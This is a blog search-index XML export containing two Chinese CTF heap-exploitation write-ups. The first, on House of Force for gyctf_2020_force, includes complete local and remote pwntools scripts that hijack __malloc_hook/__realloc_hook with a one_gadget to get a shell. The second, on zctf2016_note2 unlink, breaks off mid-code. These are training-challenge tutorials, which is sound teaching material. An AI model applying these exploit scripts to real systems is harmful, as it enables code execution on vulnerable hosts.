<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>House_Of_Force</title>
      <link href="/2024/09/26/House-Of-Force/"/>
      <url>/2024/09/26/House-Of-Force/</url>
      
        <content type="html"><![CDATA[<h1 id="提要"><a href="#提要" class="headerlink" title="提要"></a>提要</h1><p>参考文章：<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/#_2">ctfwiki</a></p><p><strong>神奇的泄露libc:通过malloc大于top chunk size的chunk，泄露出的chunk地址与libc存在固定的偏移</strong></p><h1 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h1><h2 id="运用条件"><a href="#运用条件" class="headerlink" title="运用条件"></a>运用条件</h2><ul><li><font color="red">可以修改top chunk的size大小</font></li><li><font color="red">可以控制分配任意大小的chunk</font></li></ul><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>当我们malloc的时候，若是空闲的堆块无法满足malloc的要求，就会从top chunk中分割合适的chunk</p><ul><li><strong>如果top chunk的分配的size是由我们控制，那么我们可以造成任意地址写</strong></li></ul><p>但是这里涉及到top chunk size的验证：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取当前的top chunk，并计算其对应的大小</span></span><br><span class="line">victim = av-&gt;top;</span><br><span class="line">size   = <span class="built_in">chunksize</span>(victim);</span><br><span class="line"><span class="comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span></span><br><span class="line"><span class="comment">// 注意size是一个无符号整型</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) </span><br><span class="line">&#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder      = <span class="built_in">chunk_at_offset</span>(victim, nb);</span><br><span class="line">    av-&gt;top        = remainder;</span><br><span class="line">    <span class="built_in">set_head</span>(victim, nb | PREV_INUSE |</span><br><span class="line">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    <span class="built_in">set_head</span>(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">check_malloced_chunk</span>(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = <span class="built_in">chunk2mem</span>(victim);</span><br><span class="line">    <span class="built_in">alloc_perturb</span>(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>要绕过第一个验证很简单，只需要将size修改为一个很大的数字就行了，如0xffffffffffff,这也是利用条件1的必要性</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">remainder      = <span class="built_in">chunk_at_offset</span>(victim, nb);</span><br><span class="line">av-&gt;top        = remainder;</span><br></pre></td></tr></table></figure><ul><li><p>上述代码实现了更新top chunk的指针， 我们只要控制分配的size,就可以实现任意地址写了。</p></li><li><p>其余的看开头文章，注意一个对齐规则。</p></li></ul><h1 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h1><h2 id="gyctf-2020-force"><a href="#gyctf-2020-force" class="headerlink" title="gyctf_2020_force"></a>gyctf_2020_force</h2><p><a href="https://buuoj.cn/challenges#gyctf_2020_force">题目链接</a></p><h3 id="ida速览"><a href="#ida速览" class="headerlink" title="ida速览"></a>ida速览</h3><p><font size="4"><strong>main</strong></font></p><ul><li>只有一个add功能</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">255</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">255</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1:add&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2:puts&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, nptr, <span class="number">0xFuLL</span>);</span><br><span class="line">    v3 = <span class="built_in">atol</span>(nptr);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">show</span>();                                   <span class="comment">// 没什么用的puts</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font size="4"><strong>add</strong></font></p><p><img src="/2024/09/26/House-Of-Force/capture_20240926131129316.bmp"></p><h3 id="思路分析-本地运行分析"><a href="#思路分析-本地运行分析" class="headerlink" title="思路分析(本地运行分析)"></a>思路分析(本地运行分析)</h3><ul><li>只有一个add函数，只要malloc size小于0x50，就存在堆溢出，可以用来修改top chunk size</li></ul><p><font size="4" color="red"><strong>泄露Libc</strong></font></p><ul><li>但是如何泄露libc呢？如开头所说，神奇的泄露libc，我们malloc一个很大的size，此时是通过mmap分配的chunk，该chunk的地址和libc存在固定的偏移，如下：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;bbbb&#x27;</span>) + <span class="number">0x3ffff0</span> <span class="comment"># libc文件不同，偏移不同</span></span><br><span class="line">success(<span class="string">&quot;libc_base address : &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure><p><img src="/2024/09/26/House-Of-Force/capture_20240926132253352.bmp"></p><ul><li>左边就是泄露的地址，右边是libc的地址，固定偏移在gdb里面用distance求一下即可，这样我们就获得了libc的基地址</li></ul><p><font size="4" color="red">实现HOF</font></p><ul><li>接下来就是修改topchunk的size,并且为修改malloc_hook做好准备</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 有堆溢出，可打House of Force</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heapaddr = add(<span class="number">0x10</span>,payload) <span class="comment"># size = 0x21,topchunk在该chunk的+0x10处</span></span><br><span class="line">success(<span class="string">&quot;chunk0 address : &quot;</span>+<span class="built_in">hex</span>(heapaddr))</span><br><span class="line">top = heapaddr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment"># one= [0x45216,0x4526a,0xf02a4,0xf1147]  # 远程环境的onegadget</span></span><br><span class="line">onegadget = libc_base + <span class="number">0x4527a</span> <span class="comment"># 本地偏移</span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br></pre></td></tr></table></figure><ul><li>简单的溢出修改top chunk 的 size，并且通过chunk0获得top chunk的地址，通过libc基地址获得对应函数地址</li><li><strong>下面就是任意地址写了，先要确定offset是多少。</strong>这里我们要修改malloc_hook函数为onegadget,那么offset 就是malloc_hook - top chunk</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset =  malloc_hook - top </span><br></pre></td></tr></table></figure><ul><li>偏移确认完成，正式的运用却是offset-0x20，-0x10用于对于，-0x10将malloc_hook放到user data部分</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x20</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(onegadget))</span><br></pre></td></tr></table></figure><p><img src="/2024/09/26/House-Of-Force/capture_20240926190835186.bmp"></p><ul><li>最后只需要再次调用malloc即可，但是可以发现，将onegadget都试完，也是无法getshell的，为什么呢?</li></ul><p><font size="4" color="red">realloc和malloc共同利用</font></p><ul><li>参考我写的：[这篇文章](<a href="https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc#">https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc#</a> 《fastbin_attack》)</li><li>所以我们还需要将offset-0x10，去修改realloc_hook为onegadget，然后将malloc函数修改为realloc+n的位置(也是需要尝试的，一般是0x4)</li><li>当我们调用malloc的时候，先执行push,将rsp往低地址调，然后执行realloc_hook即onegadget，从而getshell.</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(onegadget) + p64(realloc+<span class="number">0x4</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2024/09/26/House-Of-Force/capture_20240926192847620.bmp"></p><h3 id="本地完整EXP"><a href="#本地完整EXP" class="headerlink" title="本地完整EXP"></a>本地完整EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>) <span class="comment"># 本地</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;addr 0x&quot;</span>)</span><br><span class="line">    heapaddr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    <span class="keyword">return</span> heapaddr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对size无限制，malloc大chunk使得mmap分配chunk</span></span><br><span class="line"><span class="comment"># 该chunk和libc有固定的偏移</span></span><br><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;bbbb&#x27;</span>) + <span class="number">0x3ffff0</span></span><br><span class="line">success(<span class="string">&quot;libc_base address : &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有堆溢出，可打House of Force</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heapaddr = add(<span class="number">0x10</span>,payload) <span class="comment"># size = 0x21,topchunk在该chunk的+0x10处</span></span><br><span class="line">success(<span class="string">&quot;chunk0 address : &quot;</span>+<span class="built_in">hex</span>(heapaddr))</span><br><span class="line">top = heapaddr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] </span><br><span class="line">onegadget = libc_base + <span class="number">0x4527a</span> <span class="comment"># 本地的onegadget </span></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;onegadget : &quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(onegadget) + p64(realloc+<span class="number">0x4</span>))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="远程完整EXP"><a href="#远程完整EXP" class="headerlink" title="远程完整EXP"></a>远程完整EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28245</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/home/pwn/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;) # 本地</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;addr 0x&quot;</span>)</span><br><span class="line">    heapaddr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content\n&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    <span class="keyword">return</span> heapaddr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对size无限制，malloc大chunk使得mmap分配chunk</span></span><br><span class="line"><span class="comment"># 该chunk和libc有固定的偏移</span></span><br><span class="line">libc_base = add(<span class="number">0x200000</span>,<span class="string">b&#x27;bbbb&#x27;</span>) + <span class="number">0x200ff0</span> <span class="comment"># libc不同,偏移不同</span></span><br><span class="line">success(<span class="string">&quot;libc_base address : &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 有堆溢出，可打House of Force</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">heapaddr = add(<span class="number">0x10</span>,payload) <span class="comment"># size = 0x21,topchunk在该chunk的+0x10处</span></span><br><span class="line">success(<span class="string">&quot;chunk0 address : &quot;</span>+<span class="built_in">hex</span>(heapaddr))</span><br><span class="line">top = heapaddr + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] <span class="comment"># </span></span><br><span class="line"><span class="comment"># one= [0x45216,0x4526a,0xf02a4,0xf1147] </span></span><br><span class="line">onegadget = libc_base + <span class="number">0x4526a</span> </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;onegadget : &quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"></span><br><span class="line">offset =  malloc_hook - top </span><br><span class="line">success(<span class="string">&quot;offset : &quot;</span>+<span class="built_in">hex</span>(offset))</span><br><span class="line">add(offset - <span class="number">0x30</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(onegadget) + p64(realloc+<span class="number">0x4</span>)) <span class="comment"># +0x10也是可以的</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;2:puts\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfpwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zctf2016_note2-unlink(unlink精讲)</title>
      <link href="/2024/09/25/zctf2016-note2-unlink/"/>
      <url>/2024/09/25/zctf2016-note2-unlink/</url>
      
        <content type="html"><![CDATA[<h1 id="无法堆溢出修改chunk的unlink-整数溢出"><a href="#无法堆溢出修改chunk的unlink-整数溢出" class="headerlink" title="无法堆溢出修改chunk的unlink+整数溢出"></a>无法堆溢出修改chunk的unlink+整数溢出</h1><p><a href="https://buuoj.cn/challenges#zctf2016_note2">题目链接</a></p><p>有符号整型与无符号整型比较 -&gt; 存在溢出</p><h1 id="unlink完整表示"><a href="#unlink完整表示" class="headerlink" title="unlink完整表示"></a>unlink完整表示</h1><ul><li><strong>以往的unlink都是可以堆溢出修改相邻chunk的prev_size以及其size_inuse</strong>，然后构造出一个fake_free_chunk，然后free相邻的chunk，这两个chunk就会合并，从而达到unlink的效果，如下图：</li></ul><p><img src="/2024/09/25/zctf2016-note2-unlink/unlink.drawio.png"></p><ul><li>接着上图讲：chunk1是构造成了一个fake_chunk，接着free(chunk2),那么这两个chunk将会合并，从而绕过检测，达到unlink的效果。</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 对于unsorted bin 双向链表的检测</span></span><br><span class="line">chunk FD表示chunk的下一个chunk BK表示chunk的上一个chunk</span><br><span class="line">chunk.fd -&gt; FD  FD.bk -&gt; chunk      chunk.bk -&gt; BK   BK.fd -&gt; chunk</span><br></pre></td></tr></table></figure><p><img src="/2024/09/25/zctf2016-note2-unlink/unlink2.jpg"></p><ul><li>如上图，相当于把heap[0]迁移到了 -0x18的位置，这就是完整的unlink利用方法。</li></ul><h1 id="ida程序执行流分析"><a href="#ida程序执行流分析" class="headerlink" title="ida程序执行流分析"></a>ida程序执行流分析</h1><h2 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">0x3Cu</span>);</span><br><span class="line">  <span class="comment">// 下面这两步随便输入，对于Unlink没有影响</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your name:&quot;</span>);</span><br><span class="line">  <span class="built_in">input1</span>(&amp;unk_<span class="number">6020E0</span>, <span class="number">64LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your address:&quot;</span>);</span><br><span class="line">  <span class="built_in">input1</span>(&amp;unk_602180, <span class="number">96LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( <span class="built_in">menu</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="built_in">add</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">show</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="built_in">edit</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="built_in">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="add"><a href="#add" class="headerlink" title="add"></a>add</h2><ul><li>对于size有要求</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> add()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned <span class="built_in">int</span> v1; // eax</span><br><span class="line">  unsigned <span class="built_in">int</span> size; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  void *chunk_data_addr; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( heapidx &gt; <span class="number">3</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;note lists are full&quot;</span>);</span><br><span class="line">  puts(<span class="string">&quot;Input the length of the note content:(less than 128)&quot;</span>);</span><br><span class="line">  size = <span class="built_in">input</span>();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x80</span> )                            // size &lt;= <span class="number">0x80</span></span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">&quot;Too long&quot;</span>);</span><br><span class="line">  chunk_data_addr = malloc(size);</span><br><span class="line">  puts(<span class="string">&quot;Input the note content:&quot;</span>);</span><br><span class="line">  input1(chunk_data_addr, size, <span class="number">10</span>);</span><br><span class="line">  sub_400B10(chunk_data_addr);</span><br><span class="line">  *(&amp;heaplist + heapidx) = chunk_data_addr;</span><br><span class="line">  chunk_size[heapidx] = size;</span><br><span class="line">  v1 = heapidx++;</span><br><span class="line">  <span class="keyword">return</span> printf(<span class="string">&quot;note add success, the id is %d\n&quot;</span>, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><ul><li>%s输出，可以泄露libc</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">  <span class="built_in">LODWORD</span>(v0) = <span class="built_in">input</span>();</span><br><span class="line">  idx = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(&amp;heaplist + v0);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">      <span class="built_in">LODWORD</span>(v0) = <span class="built_in">printf</span>(<span class="string">&quot;Content is %s\n&quot;</span>, *(&amp;heaplist + idx));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><ul><li>最复杂的地方，也是最重要的地方，其实只需要关注输入1的overwrite</li><li>这里是先malloc了一个(0xa0)的chunk，然后向该chunk填入数据，进行overwrite，最后free掉这个</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-E4h]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+10h] [rbp-E0h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">128</span>]; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// [rsp+A0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+D8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( heapidx )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">    v2 = <span class="built_in">input</span>();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      src = *(&amp;heaplist + v2);</span><br><span class="line">      v5 = chunk_size[v2];</span><br><span class="line">      <span class="keyword">if</span> ( src )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;</span>);</span><br><span class="line">        v3 = <span class="built_in">input</span>();</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">1</span> || v3 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">            dest[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">          v7 = <span class="built_in">malloc</span>(<span class="number">0xA0uLL</span>);</span><br><span class="line">          <span class="built_in">strcpy</span>(v7, <span class="string">&quot;TheNewContents:&quot;</span>);</span><br><span class="line">          <span class="built_in">printf</span>(v7);</span><br><span class="line">          <span class="built_in">input1</span>(v7 + <span class="number">15</span>, <span class="string">&#x27;\x90&#x27;</span>, <span class="number">10</span>);</span><br><span class="line">          <span class="built_in">sub_400B10</span>(v7 + <span class="number">15</span>);</span><br><span class="line">          v0 = v7;</span><br><span class="line">          v0[v5 - <span class="built_in">strlen</span>(dest) + <span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">strncat</span>(dest, v7 + <span class="number">15</span>, <span class="number">0xFFFFFFFFFFFFFFFFLL</span>);</span><br><span class="line">  